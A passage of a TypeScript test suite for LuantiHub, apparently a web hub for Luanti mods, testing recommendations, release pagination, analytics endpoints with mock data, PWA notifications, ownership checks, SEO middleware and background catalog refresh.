    expect(recommendations.some(r => r.id === viewedPkg.id)).toBe(false);
    expect(recommendations.some(r => r.id === unrelatedTxp.id)).toBe(false);
    // Same-author diversity cap: at most 1 of sakel-hub's other mods is included when other strong matches exist
    expect(recommendations.filter(r => r.author === 'sakel-hub').length).toBe(1);

    // 3. Verify PackageDetailModalComponent 5-per-page release pagination + Latest badge + lazy IntersectionObserver loading
    const origIO = (globalThis as any).IntersectionObserver;
    let observerInstance: any = null;
    (globalThis as any).IntersectionObserver = class MockIntersectionObserver {
      callback: IntersectionObserverCallback;
      constructor(cb: IntersectionObserverCallback) {
        this.callback = cb;
        observerInstance = this;
      }
      observe() {}
      disconnect() {}
      unobserve() {}
      takeRecords() { return []; }
    };

    try {
      const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
      const modalComp = modalFixture.componentInstance;
      (pkgService as any)._activePackage.set(viewedPkg);
      modalComp.package = viewedPkg;
      modalComp.releases.set(rawUnorderedReleases as any);
      modalComp.activeTab.set('releases');
      modalFixture.detectChanges();

      // Releases are capped at 10, sorted newest-first (2.0.4 at index 0), and paginated 5 per page (2 pages total)
      expect(modalComp.cappedReleases().length).toBe(10);
      expect(modalComp.totalReleasePages()).toBe(2);
      expect(modalComp.paginatedReleases().length).toBe(5);
      expect(modalComp.paginatedReleases()[0].version).toBe('2.0.4');
      expect((modalFixture.nativeElement as HTMLElement).textContent).toContain('Latest');

      // Advance to Page 2 of Releases
      modalComp.nextReleasesPage();
      modalFixture.detectChanges();
      expect(modalComp.releasesPage()).toBe(2);
      expect(modalComp.paginatedReleases().length).toBe(5);
      expect(modalComp.paginatedReleases()[0].version).toBe('v1.4.0');

      // Before scrolling near the Similar Packages sentinel, isSimilarNearViewport is false and cards are not rendered
      expect(modalComp.isSimilarNearViewport()).toBe(false);
      expect(modalComp.similarPackages().length).toBe(0);

      // Simulate IntersectionObserver firing when the user scrolls within 240px of the Similar Packages section
      expect(observerInstance).toBeTruthy();
      observerInstance.callback([{ isIntersecting: true, intersectionRatio: 0.1 } as any], observerInstance);
      modalFixture.detectChanges();

      expect(modalComp.isSimilarNearViewport()).toBe(true);
      expect(modalComp.similarPackages().length).toBe(4);
      const renderedCards = (modalFixture.nativeElement as HTMLElement).querySelectorAll('app-package-card');
      expect(renderedCards.length).toBe(4);

      // Clicking the author button on a Similar Package card opens the Author Drawer and closing it restores the Package Detail Modal with its scroll position preserved
      const scrollContainer = (modalComp as any).modalScrollContainerRef?.nativeElement as HTMLElement;
      expect(scrollContainer).toBeTruthy();
      Object.defineProperty(scrollContainer, 'scrollTop', { value: 640, writable: true, configurable: true });
      modalComp.onModalContainerScroll();

      const firstSimCardAuthorBtn = renderedCards[0].querySelector('a[aria-label*="View Author Profile"]') as HTMLAnchorElement;
      expect(firstSimCardAuthorBtn).toBeTruthy();
      firstSimCardAuthorBtn.click();
      modalFixture.destroy();
      expect(pkgService.activeAuthorUsername()).toBeTruthy();
      expect(pkgService.activePackage()).toBeNull();

      pkgService.closeAuthorDrawer(false, true);
      expect(pkgService.activeAuthorUsername()).toBeNull();
      expect(pkgService.activePackage()?.id).toBe(viewedPkg.id);

      // Re-opening the Package Detail Modal restores the saved scrollTop, Similar Packages visibility, active tab, and release page
      const reopenedModalFixture = TestBed.createComponent(PackageDetailModalComponent);
      const reopenedModalComp = reopenedModalFixture.componentInstance;
      reopenedModalComp.package = viewedPkg;
      reopenedModalFixture.detectChanges();
      const reopenedScrollContainer = (reopenedModalComp as any).modalScrollContainerRef?.nativeElement as HTMLElement;
      expect(reopenedScrollContainer).toBeTruthy();
      Object.defineProperty(reopenedScrollContainer, 'scrollTop', { value: 0, writable: true, configurable: true });
      reopenedModalComp.ngAfterViewInit();
      expect(reopenedModalComp.isSimilarNearViewport()).toBe(true);
      expect(reopenedModalComp.activeTab()).toBe('releases');
      expect(reopenedModalComp.releasesPage()).toBe(2);
      expect(reopenedScrollContainer.scrollTop).toBe(640);
    } finally {
      (globalThis as any).IntersectionObserver = origIO;
    }
  });

  it('should render a translucent frosted-glass second-row navigation bar (< 2xl), enforce search bar min-width, and size the Hero Billboard with a viewport-aware dvh clamp', () => {
    const headerFixture = TestBed.createComponent(HeaderComponent);
    headerFixture.detectChanges();
    const headerEl = headerFixture.nativeElement as HTMLElement;

    // 1. Search bar container enforces a minimum width so it never collapses at 1280x720
    const searchInput = headerEl.querySelector('#main-search-input') as HTMLInputElement;
    expect(searchInput).toBeTruthy();
    const searchWrapper = searchInput.parentElement?.parentElement as HTMLElement;
    expect(searchWrapper.className).toContain('min-w-[140px]');

    // 2. Second-row category strip is visible below 2xl (including 1280x720) and uses translucent frosted-glass styling instead of opaque bg-slate-950/80
    const secondNavRow = headerEl.querySelector('div.border-t.overflow-x-auto') as HTMLElement;
    expect(secondNavRow).toBeTruthy();
    expect(secondNavRow.className).toContain('2xl:hidden');
    expect(secondNavRow.className).toContain('bg-white/[0.02]');
    expect(secondNavRow.className).not.toContain('bg-slate-950/80');

    const navButtons = Array.from(secondNavRow.querySelectorAll('a, button'));
    expect(navButtons.length).toBe(6);
    expect(navButtons[0].className).toContain('glass-btn-sky');
    expect(navButtons[1].className).toContain('glass-btn');

    // 3. HeroBillboardComponent retains 16:9 aspect-video sizing
    const heroFixture = TestBed.createComponent(HeroBillboardComponent);
    heroFixture.detectChanges();
    const heroEl = heroFixture.nativeElement as HTMLElement;
    expect(heroEl.innerHTML).toContain('aspect-video');
    expect(heroEl.innerHTML).toContain('lg:min-h-[600px]');
  });

  it('should enforce strict author/admin access control on package & author analytics endpoints and render granular download reasons, platforms, and timeframes', async () => {
    const authService = TestBed.inject(AuthService);
    const pkgService = TestBed.inject(PackageService);
    const secret = 'test-analytics-secret-32-bytes-key!!';

    const ownerToken = await createSessionToken('u_owner', secret);
    const strangerToken = await createSessionToken('u_stranger', secret);
    const adminToken = await createSessionToken('u_admin', secret);

    const todayStr = new Date().toISOString().slice(0, 10);

    const mockDb = {
      prepare(sql: string) {
        return {
          bind(...args: any[]) {
            return {
              async first() {
                if (sql.includes('FROM users WHERE id = ?')) {
                  if (args[0] === 'u_owner') {
                    return { id: 'u_owner', username: 'sakel', display_name: 'SaKeL', role: 'user' };
                  }
                  if (args[0] === 'u_stranger') {
                    return { id: 'u_stranger', username: 'other_user', display_name: 'Other', role: 'user' };
                  }
                  if (args[0] === 'u_admin') {
                    return { id: 'u_admin', username: 'hub_admin', display_name: 'Admin', role: 'admin' };
                  }
                }
                if (sql.includes('FROM packages')) {
                  return {
                    id: 'sakel/x_farming',
                    author_id: 'u_owner',
                    author_name: 'sakel',
                    name: 'x_farming',
                    title: 'X Farming',
                    type: 'mod',
                    provider: 'codeberg',
                    repo_url: 'https://codeberg.org/sakel/x_farming'
                  };
                }
                return null;
              },
              async all() {
                if (sql.includes('FROM user_identities WHERE user_id = ?')) {
                  if (args[0] === 'u_owner') {
                    return {
                      results: [{ provider: 'codeberg', username: 'sakel', verified: 1 }]
                    };
                  }
                  if (args[0] === 'u_stranger') {
                    return {
                      results: [{ provider: 'github', username: 'other_user', verified: 1 }]
                    };
                  }
                  if (args[0] === 'u_admin') {
                    return {
                      results: [{ provider: 'github', username: 'hub_admin', verified: 1 }]
                    };
                  }
                }
                if (sql.includes('FROM package_daily_downloads')) {
                  return {
                    results: [
                      {
                        package_id: 'sakel/x_farming',
                        download_date: todayStr,
                        downloads_count: 14,
                        platform_luanti: 10,
                        platform_web: 4,
                        reason_new: 6,
                        reason_update: 3,
                        reason_dependency: 1,
                        reason_web: 4,
                        views_luanti: 25,
                        views_web: 15
                      }
                    ]
                  };
                }
                if (sql.includes('FROM packages')) {
                  return {
                    results: [
                      {
                        id: 'sakel/x_farming',
                        author_name: 'sakel',
                        name: 'x_farming',
                        title: 'X Farming',
                        type: 'mod',
                        provider: 'codeberg'
                      }
                    ]
                  };
                }
                return { results: [] };
              },
              async run() {
                return { success: true };
              }
            };
          },
          async all() {
            return { results: [] };
          },
          async run() {
            return { success: true };
          }
        };
      }
    };

    // 1. Public unauthenticated request to /api/packages/sakel/x_farming/stats -> 200 OK (ContentDB open analytics model)
    const unauthRes = await packageStatsOnRequestGet({
      request: new Request('https://luantihub.local/api/packages/sakel/x_farming/stats?days=7'),
      params: { author: 'sakel', name: 'x_farming' },
      env: { DB: mockDb, SESSION_SECRET: secret }
    });
    expect(unauthRes.status).toBe(200);
    expect(unauthRes.headers.get('Cache-Control')).toContain('public');

    // 2. Non-owner request -> 200 OK
    const strangerRes = await packageStatsOnRequestGet({
      request: new Request('https://luantihub.local/api/packages/sakel/x_farming/stats?days=7', {
        headers: { Cookie: `lh_session=${strangerToken}` }
      }),
      params: { author: 'sakel', name: 'x_farming' },
      env: { DB: mockDb, SESSION_SECRET: secret }
    });
    expect(strangerRes.status).toBe(200);

    // 3. Verified Package Author request -> 200 OK with granular reasons, platforms & views
    const ownerRes = await packageStatsOnRequestGet({
      request: new Request('https://luantihub.local/api/packages/sakel/x_farming/stats?days=7', {
        headers: { Cookie: `lh_session=${ownerToken}` }
      }),
      params: { author: 'sakel', name: 'x_farming' },
      env: { DB: mockDb, SESSION_SECRET: secret }
    });
    expect(ownerRes.status).toBe(200);
    const ownerStats = await ownerRes.json();
    expect(ownerStats.days).toBe(7);
    expect(ownerStats.dates.length).toBe(7);
    expect(ownerStats.summary.periodDownloads).toBe(14);
    expect(ownerStats.summary.reasonsTotal).toEqual({
      new: 6,
      update: 3,
      dependency: 1,
      web: 4
    });
    expect(ownerStats.summary.platformsTotal).toEqual({
      luanti: 10,
      web: 4
    });
    expect(ownerStats.summary.totalViews).toBe(40);
    expect(ownerStats.summary.conversionRatePercent).toBe(35);

    // 4. Request to /api/authors/sakel/stats -> 200 OK with package_breakdown
    const adminAuthorRes = await authorStatsOnRequestGet({
      request: new Request('https://luantihub.local/api/authors/sakel/stats?days=30', {
        headers: { Cookie: `lh_session=${adminToken}` }
      }),
      params: { username: 'sakel' },
      env: { DB: mockDb, SESSION_SECRET: secret, ADMIN_USERS: 'hub_admin' }
    });
    expect(adminAuthorRes.status).toBe(200);
    const authorStats = await adminAuthorRes.json();
    expect(authorStats.username).toBe('sakel');
    expect(authorStats.package_breakdown.length).toBeGreaterThan(0);
    expect(authorStats.package_breakdown[0].name).toBe('x_farming');
    expect(authorStats.package_breakdown[0].totalPeriodDownloads).toBe(14);

    // 5. Verify PackageDetailModalComponent shows Analytics tab for all visitors (including guests and authors)
    const pkg = (pkgService as any).normalizePackage({
      id: 'sakel/x_farming',
      author: 'sakel',
      name: 'x_farming',
      title: 'X Farming',
      type: 'mod',
      provider: 'codeberg',
      repo_url: 'https://codeberg.org/sakel/x_farming'
    });

    (authService as any)._currentUser.set(null);
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    modalFixture.componentInstance.package = pkg;
    modalFixture.detectChanges();
    expect((modalFixture.nativeElement as HTMLElement).textContent).toContain('Analytics');

    // Selecting the Analytics tab while logged out renders <app-download-analytics-chart>
    modalFixture.componentInstance.activeTab.set('analytics');
    modalFixture.detectChanges();
    await modalFixture.whenStable();
    modalFixture.detectChanges();
    expect((modalFixture.nativeElement as HTMLElement).querySelector('app-download-analytics-chart')).not.toBeNull();

    // Now sign in as verified author 'sakel'
    (authService as any)._currentUser.set({
      id: 'u_owner',
      username: 'sakel',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      identities: [{ provider: 'codeberg', username: 'sakel', verified: true }]
    });
    modalFixture.detectChanges();
    expect((modalFixture.nativeElement as HTMLElement).textContent).toContain('Analytics');

    // 6. Verify DownloadAnalyticsChartComponent renders KPI cards, reason breakdown, and series toggles
    const chartFixture = TestBed.createComponent(DownloadAnalyticsChartComponent);
    const chartComp = chartFixture.componentInstance;
    chartComp.statsData.set(ownerStats);
    chartFixture.detectChanges();

    expect(chartComp.luantiPlatformPercent()).toBe(71.4);
    expect(chartComp.primaryDriver().label).toBe('analytics.reasonNew');
    expect(chartComp.reasonBreakdownItems().length).toBe(4);

    chartComp.setSeriesMode('platform');
    expect(chartComp.activeSeriesList().map(s => s.key)).toEqual(['platform_luanti', 'platform_web']);
    chartComp.setSeriesMode('source');
    expect(chartComp.activeSeriesList().map(s => s.key)).toEqual(['source_contentdb', 'source_luantihub']);
  });

  it('should select custom badged LuantiHub icons per notification variant and await ServiceWorker ready when installing', async () => {
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);
    localStorage.removeItem('lh_seen_notification_tags');

    settingsService.notificationsEnabled.set(true);
    settingsService.notifyModeration.set(true);
    settingsService.notifyAdminQueue.set(true);
    settingsService.notifyAppUpdates.set(true);
    settingsService.notifyNewGitPackages.set(true);

    // 1. Verify variant icon mapping for all 6 notification types
    expect(
      pwaService.getNotificationVariantIconPath({
        title: 'Issue Resolved · SaKeL/everness',
        body: 'Resolved',
        tag: 't1',
        category: 'moderation',
        variant: 'resolved'
      })
    ).toBe('/icons/notif-resolved.png');

    expect(
      pwaService.getNotificationVariantIconPath({
        title: 'Report Dismissed · SaKeL/everness',
        body: 'Dismissed',
        tag: 't2',
        category: 'moderation'
      })
    ).toBe('/icons/notif-dismissed.png');

    expect(
      pwaService.getNotificationVariantIconPath({
        title: 'Moderation Update · SaKeL/everness',
        body: 'Updated',
        tag: 't3',
        category: 'moderation'
      })
    ).toBe('/icons/notif-moderation.png');

    expect(
      pwaService.getNotificationVariantIconPath({
        title: 'New Moderation Report · SaKeL/everness',
        body: 'Admin alert',
        tag: 't4',
        category: 'admin_queue',
        variant: 'admin_queue'
      })
    ).toBe('/icons/notif-admin-alert.png');

    expect(
      pwaService.getNotificationVariantIconPath({
        title: 'LuantiHub Update Available',
        body: 'Update ready',
        tag: 't5',
        category: 'app_update',
        variant: 'app_update'
      })
    ).toBe('/icons/notif-app-update.png');

    expect(
      pwaService.getNotificationVariantIconPath({
        title: 'New Git Package · [MOD] Everness',
        body: 'New package',
        tag: 't6',
        category: 'new_git_package',
        variant: 'new_git_package'
      })
    ).toBe('/icons/notif-new-package.png');

    // 2. Verify sendNativeNotification awaits navigator.serviceWorker.ready when SW is installing
    const swCalls: Array<{ title: string; options?: NotificationOptions }> = [];
    const fallbackCalls: Array<{ title: string; options?: NotificationOptions }> = [];
    const origNotification = (window as any).Notification;
    const origSwDescriptor = Object.getOwnPropertyDescriptor(navigator, 'serviceWorker');

    class MockNotification {
      static permission: NotificationPermission = 'granted';
      onclick: (() => void) | null = null;
      constructor(public title: string, public options?: NotificationOptions) {
        fallbackCalls.push({ title, options });
      }
      close(): void {}
    }
    (window as any).Notification = MockNotification;

    const activeReg = {
      active: { state: 'activated' },
      installing: null,
      waiting: null,
      showNotification: async (title: string, options?: NotificationOptions) => {
        swCalls.push({ title, options });
      }
    };
    const installingReg = {
      active: null,
      installing: { state: 'installing' },
      waiting: null,
      showNotification: async () => {
        throw new TypeError('No active service worker');
      }
    };

    Object.defineProperty(navigator, 'serviceWorker', {
      configurable: true,
      value: {
        getRegistration: async () => installingReg,
        ready: new Promise(resolve => setTimeout(() => resolve(activeReg), 15))
      }
    });

    try {
      const sent = await pwaService.sendNativeNotification({
        title: 'Report Dismissed · SaKeL/everness',
        body: 'Bulk dismissed automated 404 reports.',
        tag: 'lh-test-sw-ready-dismissed',
        category: 'moderation',
        variant: 'dismissed'
      });
      expect(sent).toBe(true);
      expect(swCalls.length).toBe(1);
      expect(swCalls[0].options?.icon).toContain('/icons/notif-dismissed.png');
      expect(fallbackCalls.length).toBe(0);

      // 3. Verify checkForUpdate(false) fires the native "LuantiHub Updated" notification
      // with /icons/notif-app-update.png when /ngsw.json has a newer main-*.js bundle
      const mockScript = document.createElement('script');
      mockScript.setAttribute('src', 'main-OLDHASH1.js');
      document.body.appendChild(mockScript);
      const origFetch = globalThis.fetch;
      globalThis.fetch = (async (input: any) => {
        const url = typeof input === 'string' ? input : input?.url || '';
        if (url.includes('/ngsw.json')) {
          return new Response(
            JSON.stringify({
              assetGroups: [{ name: 'app', urls: ['/index.html', '/main-NEWHASH2.js'] }]
            }),
            { status: 200, headers: { 'Content-Type': 'application/json' } }
          );
        }
        return new Response('', { status: 404 });
      }) as typeof fetch;

      try {
        pwaService.updateAvailable.set(false);
        // Simulate hung SwUpdate when navigator.serviceWorker.controller is null after domain migration
        const origSwUpdate = (pwaService as any).swUpdate;
        const activateUpdateSpy = vi.fn().mockResolvedValue(true);
        (pwaService as any).swUpdate = {
          isEnabled: true,
          checkForUpdate: () => new Promise<boolean>(() => {}), // never resolves
          activateUpdate: activateUpdateSpy
        };

        const hasUpdate = await pwaService.checkForUpdate(true);
        expect(hasUpdate).toBe(true);
        expect(pwaService.checkingForUpdate()).toBe(false);
        expect(pwaService.updateAvailable()).toBe(true);
        await new Promise(resolve => setTimeout(resolve, 25));
        expect(activateUpdateSpy).toHaveBeenCalled();
        expect(swCalls.length).toBe(2);
        expect(swCalls[1].title).toBe('LuantiHub Updated');
        expect(swCalls[1].options?.body).toBe(
          'LuantiHub was updated automatically in the background to the latest version.'
        );
        expect(swCalls[1].options?.tag).toBe('lh-app-update-main-NEWHASH2.js');
        expect(swCalls[1].options?.icon).toContain('/icons/notif-app-update.png');
        expect(swCalls[1].options?.data?.action).toBeUndefined();

        (pwaService as any).swUpdate = origSwUpdate;
      } finally {
        globalThis.fetch = origFetch;
        mockScript.remove();
      }
    } finally {
      (window as any).Notification = origNotification;
      if (origSwDescriptor) {
        Object.defineProperty(navigator, 'serviceWorker', origSwDescriptor);
      }
    }
  });

  it('should detect updated packages, use package thumbnail or notif-package-update.png fallback, and respect notifyPackageUpdates toggle', async () => {
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);

    expect(
      pwaService.getNotificationVariantIconPath({
        title: 'Package Updated · [MOD] Mystical Pixie',
        body: 'v1.2.0',
        tag: 't-pkg-upd',
        category: 'package_update',
        variant: 'package_update'
      })
    ).toBe('/icons/notif-package-update.png');

    settingsService.notificationsEnabled.set(true);
    settingsService.notifyPackageUpdates.set(true);
    localStorage.removeItem('lh_known_package_versions_v1');

    const sentPayloads: any[] = [];
    const origSend = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (payload: any) => {
      sentPayloads.push(payload);
      return true;
    };

    try {
      const initialCatalog = [
        {
          id: 'SaKeL/pixie',
          author: 'SaKeL',
          name: 'pixie',
          title: 'Mystical Pixie Companion',
          type: 'mod' as const,
          short_desc: 'Companion mod',
          thumbnail: 'https://content.luanti.org/uploads/pixie-thumb.png',
          score: 5,
          downloads: 500,
          license: 'MIT',
          source: 'git' as const,
          tags: ['mod'],
          release_id: 'v1.0.0',
          updated_at: '2026-10-01T10:00:00Z'
        }
      ];

      // 1st pass seeds the baseline without firing a notification
      const seededCount = await pwaService.checkAndNotifyUpdatedPackages(initialCatalog, {
        isBaselineSeedAllowed: true
      });
      expect(seededCount).toBe(0);
      expect(sentPayloads.length).toBe(0);

      // 2nd pass with new release_id / updated_at fires notification with package thumbnail
      const recentUpdateIso = new Date(Date.now() - 60_000).toISOString();
      const updatedCatalog = [
        {
          ...initialCatalog[0],
          release_id: 'v1.1.0',
          updated_at: recentUpdateIso
        }
      ];
      const notifiedCount = await pwaService.checkAndNotifyUpdatedPackages(updatedCatalog, {
        isBaselineSeedAllowed: false
      });
      expect(notifiedCount).toBe(1);
      expect(sentPayloads.length).toBe(1);
      expect(sentPayloads[0].category).toBe('package_update');
      expect(sentPayloads[0].icon).toBe('https://content.luanti.org/uploads/pixie-thumb.png');
      expect(sentPayloads[0].data?.packageId).toBe('SaKeL/pixie');

      // When notifyPackageUpdates is disabled, no notification is sent
      settingsService.notifyPackageUpdates.set(false);
      const disabledCount = await pwaService.checkAndNotifyUpdatedPackages(
        [
          {
            ...initialCatalog[0],
            release_id: 'v1.2.0',
            updated_at: new Date(Date.now() - 30_000).toISOString()
          }
        ],
        { isBaselineSeedAllowed: false }
      );
      expect(disabledCount).toBe(0);
      settingsService.notifyPackageUpdates.set(true);
    } finally {
      pwaService.sendNativeNotification = origSend;
      localStorage.removeItem('lh_known_package_versions_v1');
    }
  });

  it('should restore the previously open Package Detail Modal when navigating back from Analytics and enforce strict verified ownership', () => {
    const pkgService = TestBed.inject(PackageService);
    const authService = TestBed.inject(AuthService);

    const testPkg = {
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod' as const,
      short_desc: 'Biomes & dimensions',
      thumbnail: 'logo.svg',
      score: 4.9,
      downloads: 50000,
      license: 'LGPL-2.1',
      source: 'official' as const,
      tags: ['mod']
    };

    // Unverified handle sign-in must NOT grant package management, while public analytics remain open
    (authService as any)._currentUser.set({
      id: 'unverified_1',
      username: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'user',
      is_admin: false,
      identities: [{ provider: 'handle' as any, username: 'SaKeL', verified: false }],
      packages: []
    });
    expect(authService.canManagePackage(testPkg)).toBe(false);
    expect(authService.canViewAuthorAnalytics('SaKeL')).toBe(true);
    expect(authService.canViewAuthorAnalytics('')).toBe(false);

    // Verified OAuth identity grants management and analytics access
    (authService as any)._currentUser.set({
      id: 'verified_1',
      username: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'user',
      is_admin: false,
      identities: [
        { provider: 'contentdb', username: 'SaKeL', verified: true },
        { provider: 'github', username: 'SaKeL', verified: true }
      ],
      packages: []
    });
    expect(authService.canManagePackage(testPkg)).toBe(true);
    expect(authService.canViewAuthorAnalytics('SaKeL')).toBe(true);

    // Open Package Detail Modal, then navigate to Analytics, then close Analytics -> restores modal
    pkgService.openPackageModal(testPkg, false);
    expect(pkgService.activePackage()?.id).toBe('SaKeL/everness');

    pkgService.openAnalyticsPage({ author: 'SaKeL', name: 'everness' });
    expect(pkgService.activePackage()).toBeNull();

    pkgService.closeAnalyticsPage();
    expect(pkgService.activePackage()?.id).toBe('SaKeL/everness');

    pkgService.closePackageModal(false);
    (authService as any)._currentUser.set(null);
  });

  it('should solve Anubis PoW SHA-256 challenges (including 128-char seeds), sanitize technical errors, and inject SEO metadata for primary hub routes', async () => {
    // 1. Verify Anubis PoW solver finds a valid nonce for both short and 128-char hex randomData (3 SHA-256 blocks)
    const challengeShort = 'luantihub-mesehub-test-challenge';
    const solvedShort = solveAnubisPowChallengeSync(challengeShort, 4);
    expect(solvedShort).toBeTruthy();
    expect(solvedShort?.hashHex.startsWith('0000')).toBe(true);

    const challenge128 = 'a1b2c3d4e5f60718293a4b5c6d7e8f90'.repeat(4); // 128 chars
    const solved128 = solveAnubisPowChallengeSync(challenge128, 3);
    expect(solved128).toBeTruthy();
    expect(solved128?.hashHex.startsWith('000')).toBe(true);

    // 2. Verify formatFriendlyAuthError & sanitizeUserFacingError hide raw technical errors
    expect(formatFriendlyAuthError('Mesehub returned invalid token payload', 'mesehub')).toBe(
      "We couldn't complete sign-in with Mesehub right now. Please try again in a moment, or use Direct Author / Community Sign-In below."
    );
    expect(formatFriendlyAuthError('provider_unavailable', 'mesehub')).toBe(
      "We couldn't complete sign-in with Mesehub right now. Please try again in a moment, or use Direct Author / Community Sign-In below."
    );
    expect(formatFriendlyAuthError('session_expired', 'mesehub')).toBe(
      'Your sign-in session expired. Please try signing in again.'
    );
    expect(formatFriendlyAuthError('provider_busy', 'github')).toBe(
      'GitHub is temporarily busy. Please wait a moment and try signing in again.'
    );
    expect(
      sanitizeUserFacingError('Mesehub token exchange failed (HTTP 502)', 'Friendly fallback.')
    ).toBe('Friendly fallback.');

    // 3. Verify PackageService maps primary categories to clean first-level hub routes
    const pkgService = TestBed.inject(PackageService);
    pkgService.selectPrimaryNavTab('game');
    expect(pkgService.getPrimaryCategoryRoutePath()).toBe('/games');
    pkgService.selectPrimaryNavTab('mod');
    expect(pkgService.getPrimaryCategoryRoutePath()).toBe('/mods');
    pkgService.selectPrimaryNavTab('txp');
    expect(pkgService.getPrimaryCategoryRoutePath()).toBe('/texture-packs');
    pkgService.selectPrimaryNavTab('git');
    expect(pkgService.getPrimaryCategoryRoutePath()).toBe('/git');
    pkgService.resetFilters(false);
    expect(pkgService.getPrimaryCategoryRoutePath()).toBe('/');

    // 3. Verify edge middleware rewrites title, canonical, and BreadcrumbList JSON-LD for /games
    const baseHtml = `<!doctype html><html><head><title>Default</title><meta name="description" content="Default" /><link rel="canonical" id="canonical-link" href="https://luantihub.org/" /><meta property="og:title" content="Default" /><meta property="og:description" content="Default" /><meta property="og:url" content="https://luantihub.org/" /><meta name="twitter:title" content="Default" /><meta name="twitter:description" content="Default" /></head><body></body></html>`;
    const res = await edgeMiddleware({
      request: new Request('https://luantihub.org/games', { method: 'GET' }),
      next: async () =>
        new Response(baseHtml, {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8' }
        }),
      env: {}
    });
    const html = await res.text();
    expect(html).toContain('<title>Luanti Games — Open-Source Voxel Games | Luanti Hub</title>');
    expect(html).toContain('href="https://luantihub.org/games"');
    expect(html).toContain('"@type":"BreadcrumbList"');
  });

  it('should silently refresh the catalog & rankings in the background without skeleton flashes and preserve the active Hero slide when showcase re-orders', async () => {
    const pkgService = TestBed.inject(PackageService);
    const origFetch = globalThis.fetch;

    // Seed initial catalog and open activePackage with deep-hydrated desc & readme
    const initialList = [
      (pkgService as any).normalizePackage({
        id: 'Wuzzy/mineclone2',
        author: 'Wuzzy',
        name: 'mineclone2',
        title: 'VoxeLibre',
        type: 'game',
        short_desc: 'Survival sandbox game',
        downloads: 100000,
        score: 4.9,
        banner: 'https://content.luanti.org/uploads/mcl2.png'
      }),
      (pkgService as any).normalizePackage({
        id: 'sakel-hub/pixie',
        author: 'sakel-hub',
        name: 'pixie',
        title: 'Mystical Pixie Companion',
        type: 'mod',
        source: 'git',
        provider: 'github',
        short_desc: 'Pixie companion',
        downloads: 120,
        luantihub_downloads: 120,
        score: 4.8,
        download_size: 343040,
        file_size: '335 KB',
        banner: 'https://raw.githubusercontent.com/sakel-hub/pixie/main/screenshot.png'
      }),
      (pkgService as any).normalizePackage({
        id: 'Jeija/mesecons',
        author: 'Jeija',
        name: 'mesecons',
        title: 'Mesecons',
        type: 'mod',
        tags: ['automation', 'circuits'],
        short_desc: 'Digital circuitry',
        downloads: 80000,
        score: 4.8,
        banner: 'https://content.luanti.org/uploads/mesecons.png'
      })
    ];
    (pkgService as any).pendingRoutePackage = null;
    (pkgService as any)._packages.set(initialList);
    (pkgService as any)._activePackage.set({
      ...initialList[1],
      desc: 'Deep hydrated long description that must be preserved',
      readme: '# Mystical Pixie README'
    });

    const heroFixture = TestBed.createComponent(HeroBillboardComponent);
    const heroComp = heroFixture.componentInstance;
    heroFixture.detectChanges();

    // Move hero carousel to the slide displaying 'sakel-hub/pixie'
    const pixieIdx = heroComp.showcase().findIndex(p => p.id === 'sakel-hub/pixie');
    expect(pixieIdx).toBeGreaterThanOrEqual(0);
    heroComp.goTo(pixieIdx);
    heroFixture.detectChanges();
    expect(heroComp.currentPkg()?.id).toBe('sakel-hub/pixie');

    let sawLoadingTrue = false;
    globalThis.fetch = (async (input: any) => {
      if (pkgService.isLoading()) {
        sawLoadingTrue = true;
      }
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('/api/packages/?boot=1')) {
        return new Response(
          JSON.stringify({
            packages: [
              {
                id: 'Wuzzy/mineclone2',
                author: 'Wuzzy',
                name: 'mineclone2',
                title: 'VoxeLibre',
                type: 'game',
                short_desc: 'Survival sandbox game',
                downloads: 100500,
                score: 4.9,
                banner: 'https://content.luanti.org/uploads/mcl2.png'
              },
              {
                id: 'sakel-hub/pixie',
                author: 'sakel-hub',
                name: 'pixie',
                title: 'Mystical Pixie Companion',
                type: 'mod',
                source: 'git',
                provider: 'github',
                short_desc: 'Pixie companion',
                downloads: 450,
                luantihub_downloads: 450,
                score: 5.0,
                download_size: 343040,
                file_size: '335 KB',
                updated_at: new Date().toISOString(),
                banner: 'https://raw.githubusercontent.com/sakel-hub/pixie/main/screenshot.png'
              },
              {
                id: 'Jeija/mesecons',
                author: 'Jeija',
                name: 'mesecons',
                title: 'Mesecons',
                type: 'mod',
                tags: ['automation', 'circuits'],
                short_desc: 'Digital circuitry',
                downloads: 80200,
                score: 4.8,
                banner: 'https://content.luanti.org/uploads/mesecons.png'
              },
              {
                id: 'sakel-hub/everness',
                author: 'sakel-hub',
                name: 'everness',
                title: 'Everness',
                type: 'mod',
                source: 'git',
                provider: 'github',
                short_desc: 'New biomes & dimensions',
                downloads: 95000,
                contentdb_score: 2500,
                score: 5.0,
                featured: true,
                banner: 'https://content.luanti.org/uploads/everness.png'
              }
            ],
            top10Today: [
              {
                id: 'sakel-hub/everness',
                author: 'sakel-hub',
                name: 'everness',
                title: 'Everness',
                type: 'mod',
                source: 'git',
                downloads: 95000,
                score: 5.0
              },
              {
                id: 'sakel-hub/pixie',
                author: 'sakel-hub',
                name: 'pixie',
                title: 'Mystical Pixie Companion',
                type: 'mod',
                source: 'git',
                downloads: 450,
                score: 5.0,
                download_size: 343040,
                file_size: '335 KB'
              }
            ],
            top10Week: [
              {
                id: 'sakel-hub/everness',
                author: 'sakel-hub',
                name: 'everness',
                title: 'Everness',
                type: 'mod',
                source: 'git',
                downloads: 95000,
                score: 5.0
              }
            ]
          }),
          {
            status: 200,
            headers: { 'Content-Type': 'application/json', Server: 'cloudflare' }
          }
        );
      }
      return new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' } });
    }) as typeof fetch;

    try {
      const refreshed = await pkgService.refreshCatalogInBackground();
      expect(refreshed).toBe(true);
      expect(sawLoadingTrue).toBe(false);
      expect(pkgService.isLoading()).toBe(false);

      // Verify Top 10 Today & catalog updated in place
      expect(pkgService.top10TodayPackages()[0]?.id).toBe('sakel-hub/everness');
